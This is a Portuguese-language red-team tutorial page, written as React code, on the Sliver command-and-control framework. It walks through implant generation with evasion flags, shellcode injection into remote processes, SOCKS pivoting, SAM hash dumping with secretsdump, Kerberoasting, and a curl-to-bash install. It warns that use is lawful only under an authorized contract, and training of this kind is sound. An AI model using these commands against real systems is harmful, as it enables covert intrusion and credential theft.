import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Sliver() {
  return (
    <PageContainer
      title="Sliver C2 — alternativa open-source ao Cobalt Strike"
      subtitle="Framework de comando e controle (BishopFox, escrito em Go) com mTLS, HTTP(S), DNS, WireGuard e armory de extensões."
      difficulty="avancado"
      timeToRead="22 min"
    >
      <h2>Por que Sliver e não Cobalt Strike</h2>
      <p>
        <strong>Cobalt Strike</strong> custa USD 5.900/usuário/ano e exige licença comercial. <strong>Sliver</strong>{" "}
        é gratuito, open-source (BSD-3), mantido pela <strong>BishopFox</strong> e cobre 95% dos casos de uso de
        Red Team profissional: implants Windows/Linux/macOS, transports flexíveis (mTLS, HTTPS, DNS, WireGuard),
        beacons + sessions interativas, armory com extensões da comunidade. Para engagements legítimos sem
        budget para CS, Sliver é o padrão de fato em 2025.
      </p>

      <AlertBox type="warning" title="Uso autorizado apenas">
        <p>
          C2 frameworks são ferramentas de Red Team. Uso fora de escopo contratual configura crime
          (Lei 12.737/12 no Brasil, CFAA nos EUA). Tudo aqui assume <strong>contrato + scope of work assinado</strong>.
        </p>
      </AlertBox>

      <h2>Instalação no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Sliver tem pacote oficial no repo Kali",
            cmd: "sudo apt update && sudo apt install -y sliver",
            out: `Reading package lists... Done
The following NEW packages will be installed:
  sliver
0 upgraded, 1 newly installed.
Need to get 38.4 MB of archives.
Setting up sliver (1.5.42-0kali1) ...`,
            outType: "success",
          },
          {
            comment: "alternativa: binário oficial do GitHub",
            cmd: "curl -fsSL https://sliver.sh/install | sudo bash",
            out: "(instala server + client em /usr/local/bin)",
            outType: "muted",
          },
          {
            cmd: "sliver-server version",
            out: `Sliver Server v1.5.42 - cf2c2d0
Compiled at 2025-09-12T14:11:33Z
Go version: go1.22.5`,
            outType: "info",
          },
        ]}
      />

      <h2>Subir o servidor (multiplayer)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "modo standalone (single-operator)",
            cmd: "sudo sliver-server",
            out: `[*] Welcome to the sliver shell, please type 'help' for options
[*] Check for updates with the 'update' command

sliver >`,
            outType: "success",
          },
          {
            comment: "modo multiplayer: liga listener gRPC para clients remotos",
            cmd: "sudo sliver-server daemon",
            out: `[*] Starting daemon process ...
[*] Multiplayer mode enabled on 0.0.0.0:31337`,
            outType: "info",
          },
          {
            comment: "gerar config para outro operador",
            cmd: "sliver > new-operator --name jsmith --lhost c2.empresa-redteam.com",
            out: `[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /root/jsmith_c2.empresa-redteam.com.cfg`,
            outType: "warning",
          },
          {
            comment: "operador remoto importa o config",
            cmd: "sliver-client import /tmp/jsmith_c2.empresa-redteam.com.cfg",
            out: `[*] Saved new client config to: ~/.sliver-client/configs/jsmith_c2.cfg

sliver >`,
            outType: "success",
          },
        ]}
      />

      <h2>Listeners (transports)</h2>
      <CommandTable
        title="C2 channels suportados"
        variations={[
          { cmd: "mtls --lport 8888", desc: "Mutual TLS — mais seguro, certs auto-gerados.", output: "[*] Started mTLS listener on 0.0.0.0:8888" },
          { cmd: "https --lport 443 --domain c2.example.com", desc: "HTTPS com domain fronting opcional.", output: "[*] Started HTTPS listener on 0.0.0.0:443" },
          { cmd: "http --lport 80", desc: "HTTP plano (debug ou redirector na frente).", output: "[*] Started HTTP listener on 0.0.0.0:80" },
          { cmd: "dns --domains c2.example.com.", desc: "DNS tunneling — atravessa firewall corporativo.", output: "ATENÇÃO ao ponto final no domínio." },
          { cmd: "wg --lport 53", desc: "WireGuard — perfeito p/ implant em Linux.", output: "Lento de set up mas indetectável." },
          { cmd: "stage-listener --url https://0.0.0.0:443 --profile win-stager", desc: "Stager listener (entrega payload em 2 fases).", output: "Reduz tamanho do dropper inicial." },
          { cmd: "jobs", desc: "Lista listeners ativos.", output: "ID | Name | Protocol | Port" },
          { cmd: "jobs --kill 1", desc: "Mata listener pelo ID.", output: "[*] Killed job 1" },
        ]}
      />

      <h2>Gerar implant</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Windows EXE com mTLS",
            cmd: "sliver > generate --mtls c2.example.com:8888 --os windows --arch amd64 --save /tmp/",
            out: `[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m24s
[*] Implant saved to /tmp/MASTERFUL_RAINBOW.exe`,
            outType: "success",
          },
          {
            comment: "shellcode raw para injection",
            cmd: "sliver > generate --mtls c2.example.com:8888 --format shellcode --save /tmp/sc.bin",
            out: `[*] Generating new windows/amd64 implant shellcode
[*] Shellcode saved to /tmp/sc.bin (456789 bytes)`,
            outType: "info",
          },
          {
            comment: "BEACON (assíncrono — checkin a cada N segundos)",
            cmd: "sliver > generate beacon --http https://c2.example.com --seconds 60 --jitter 30 --os linux",
            out: `[*] Generating new linux/amd64 beacon implant
[*] Beacon will check in every 60s ± 30s jitter
[*] Implant saved to /tmp/SAVAGE_RHINO.elf`,
            outType: "warning",
          },
          {
            comment: "DLL para sideload (proxy DLL)",
            cmd: "sliver > generate --mtls c2.example.com --os windows --format shared --save /tmp/version.dll",
            out: "[*] Implant saved to /tmp/version.dll",
            outType: "muted",
          },
        ]}
      />

      <h3>Profiles reutilizáveis</h3>
      <Terminal
        path="~"
        lines={[
          {
            cmd: 'sliver > profiles new --mtls c2.example.com --os windows --arch amd64 --evasion win10-stealth',
            out: "[*] Saved new implant profile win10-stealth",
            outType: "success",
          },
          {
            cmd: "sliver > profiles generate win10-stealth --save /tmp/",
            out: "[*] Implant saved to /tmp/MASTERFUL_RAINBOW.exe",
            outType: "info",
          },
        ]}
      />

      <h2>Sessions e beacons</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sliver > sessions",
            out: `ID   Transport  Remote Address       Hostname   Username       Operating System  Health
==== ========= ==================== ========== ============== ================ ======
1    mtls       192.168.50.41:51223  WIN-DC01   NT AUTHORITY    windows/amd64    [ALIVE]
2    https      10.10.14.7:53412     WS-USR07   ACME\\jsmith     windows/amd64    [ALIVE]`,
            outType: "info",
          },
          {
            cmd: "sliver > use 2",
            out: `[*] Active session WS-USR07 (b2c4-...)

sliver (WS-USR07) >`,
            outType: "success",
          },
          {
            cmd: "sliver (WS-USR07) > info",
            out: `        Session ID: b2c4-...
              Name: WS-USR07
          Hostname: WS-USR07
          Username: ACME\\jsmith
               UID: S-1-5-21-...-1108
                OS: windows
              Arch: amd64
       Working Dir: C:\\Users\\jsmith
              PID: 4188
            Active C2: mtls://c2.example.com:8888`,
            outType: "default",
          },
        ]}
      />

      <h2>Comandos pós-exploração essenciais</h2>
      <CommandTable
        title="Operações dentro de uma session"
        variations={[
          { cmd: "ls / pwd / cd / cat / rm", desc: "Filesystem básico (sem dropar nada em disco).", output: "Implementado nativo no implant." },
          { cmd: "shell", desc: "Spawn shell interativo (cmd.exe/bash).", output: "[!] Spawn shell pode ser detectado por EDR." },
          { cmd: "execute -o whoami /priv", desc: "Roda comando e captura stdout.", output: "Sem -o = roda silencioso (fire-and-forget)." },
          { cmd: "execute-assembly --inject /opt/SharpHound.exe", desc: "Carrega assembly .NET em memória (sem tocar disco).", output: "Equivalente a execute-assembly do CS." },
          { cmd: "execute-shellcode /tmp/payload.bin --pid 4321", desc: "Injeta shellcode em processo remoto.", output: "Útil para mover de explorer.exe → lsass." },
          { cmd: "screenshot", desc: "Captura screenshot.", output: "[*] Saved screenshot to ~/.sliver-client/screenshots/..." },
          { cmd: "getprivs", desc: "Lista privilégios atuais.", output: "SeDebugPrivilege, SeImpersonatePrivilege, ..." },
          { cmd: "ps", desc: "Lista processos remotos.", output: "PID | PPID | Owner | Arch | Executable" },
          { cmd: "migrate 4188", desc: "Migra implant para outro processo.", output: "[*] Successfully migrated to 4188" },
          { cmd: "portfwd add -r 10.10.10.5:445 -b 127.0.0.1:4445", desc: "Port forward via implant (pivoting).", output: "Acesse SMB do alvo interno em localhost:4445." },
          { cmd: "socks5 start", desc: "Inicia SOCKS5 server local que tunela via implant.", output: "Use proxychains pra rodar nmap/impacket através." },
        ]}
      />

      <h2>Pivoting com SOCKS5</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sliver (WIN-DC01) > socks5 start",
            out: `[*] Started SOCKS5 :1081
[*] In your terminal: proxychains <command>`,
            outType: "success",
          },
          {
            comment: "configurar proxychains.conf",
            cmd: "echo 'socks5 127.0.0.1 1081' | sudo tee -a /etc/proxychains4.conf",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "agora qualquer ferramenta sai via implant",
            cmd: "proxychains nmap -sT -Pn -p445,3389 10.10.10.0/24",
            out: `[proxychains] Strict chain ... 127.0.0.1:1081 ... 10.10.10.5:445 <--socket OK
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server`,
            outType: "info",
          },
          {
            cmd: "proxychains impacket-secretsdump ACME/Administrator@10.10.10.5",
            out: "[*] Service RemoteRegistry is in stopped state\n[*] Dumping local SAM hashes ...",
            outType: "warning",
          },
        ]}
      />

      <h2>Armory — extensões da comunidade</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sliver > armory",
            out: `Armory Index Updated
========= Aliases ==========
chisel        v1.7.7   ✓ Reverse proxy
rubeus        v2.2.0   ✓ Kerberos abuse toolkit
sharphound    v2.5.6   ✓ AD enumeration
seatbelt      v1.2.2   ✓ Host enumeration
=========== Extensions ===========
credman       v1.0     ✓ Dump Windows credentials manager
hashdump      v0.1     ✓ Dump SAM/SYSTEM`,
            outType: "info",
          },
          {
            cmd: "sliver > armory install rubeus",
            out: `[*] Installing alias 'rubeus' (v2.2.0) ... done!`,
            outType: "success",
          },
          {
            cmd: "sliver (WIN-DC01) > rubeus kerberoast /nowrap",
            out: `[*] rubeus output:
[*] Action: Kerberoasting
[*] SamAccountName : sql_svc
[*] DistinguishedName : CN=sql_svc,CN=Users,DC=acme,DC=corp
[*] Hash: $krb5tgs$23$*sql_svc$ACME.CORP$...`,
            outType: "warning",
          },
        ]}
      />

      <h2>OPSEC — sumir dos radares</h2>
      <CodeBlock
        language="bash"
        title="generate com flags de evasion"
        code={`# strip de símbolos + obfuscation + canários customizados
sliver > generate \\
  --mtls c2.example.com:8888 \\
  --os windows --arch amd64 \\
  --evasion win10-stealth \\
  --skip-symbols \\
  --canary acme.corp \\
  --save /tmp/

# canary = se alguém upar o binário pro VirusTotal,
# uma DNS query pra acme.corp.canary.sliver.example
# vai te avisar que o IOC vazou

# verificar entropia (AV ama detectar entropia alta)
ent /tmp/MASTERFUL_RAINBOW.exe
# Entropy = 6.8 bits per byte  --> aceitável (>7.5 = suspeito)`}
      />

      <h2>Beacons vs Sessions</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sliver > beacons",
            out: `ID   Name             Tasks  Transport  Hostname    Last Check-In
==== ============== ===== ========== =========== ==============
B1   SAVAGE_RHINO   2     https      WS-USR07    32s
B2   SILENT_FOX     0     dns        DC01-LAB    2m 41s`,
            outType: "info",
          },
          {
            cmd: "sliver > use B1",
            out: "sliver (SAVAGE_RHINO) >",
            outType: "success",
          },
          {
            comment: "qualquer comando vira task na fila do beacon",
            cmd: "sliver (SAVAGE_RHINO) > whoami",
            out: `[*] Tasked beacon SAVAGE_RHINO (3a1c2e7f)
(o output chega no próximo check-in, ~60s)`,
            outType: "warning",
          },
          {
            comment: "ver tasks pendentes",
            cmd: "sliver (SAVAGE_RHINO) > tasks",
            out: `ID  State    Message Type  Created     Sent       Completed
== ======= ============ =========== ========== =========
3a  pending whoamiReq    14:51:01    -          -`,
            outType: "muted",
          },
        ]}
      />

      <PracticeBox
        title="Lab: instalar Sliver, gerar implant Linux e pegar callback"
        goal="Setup completo end-to-end em uma VM Kali única (server + alvo Linux fake)."
        steps={[
          "Instale o sliver via APT.",
          "Suba o sliver-server em modo standalone.",
          "Crie um listener mTLS na 8888.",
          "Gere implant linux/amd64 que aponta pra 127.0.0.1:8888.",
          "Rode o implant em outro terminal.",
          "Confirme a session no Sliver e rode `info` + `ls /etc`.",
        ]}
        command={`sudo apt install -y sliver
sudo sliver-server
# dentro do prompt:
mtls --lport 8888
generate --mtls 127.0.0.1:8888 --os linux --arch amd64 --save /tmp/
# em outro terminal:
chmod +x /tmp/MASTERFUL_RAINBOW
/tmp/MASTERFUL_RAINBOW &
# de volta ao Sliver:
sessions
use 1
info
ls /etc`}
        expected={`[*] Session 1 MASTERFUL_RAINBOW - 127.0.0.1:51223 (kali) - linux/amd64

sliver (MASTERFUL_RAINBOW) > info
        Hostname: kali
        Username: wallyson
              OS: linux
            Arch: amd64
        Working Dir: /tmp

sliver (MASTERFUL_RAINBOW) > ls /etc
/etc
=====
drwxr-xr-x  apt
-rw-r--r--  passwd
-rw-r-----  shadow`}
        verify="A session deve aparecer ALIVE em 'sessions' e o comando 'ls /etc' retornar listagem real."
      />

      <AlertBox type="info" title="Sliver vs Cobalt Strike — quando ir pago">
        <p>
          Cobalt Strike ainda lidera em <strong>Malleable C2 profiles</strong>, comunidade de aggressor scripts
          e integração com BOFs maduras. Sliver tem suporte a <strong>BOFs via COFFLoader</strong> e armory
          crescente, mas se seu cliente exige relatório formal "ferramenta do mercado" e tem budget,
          CS ainda pesa. Para tudo abaixo de Fortune 500, Sliver entrega.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
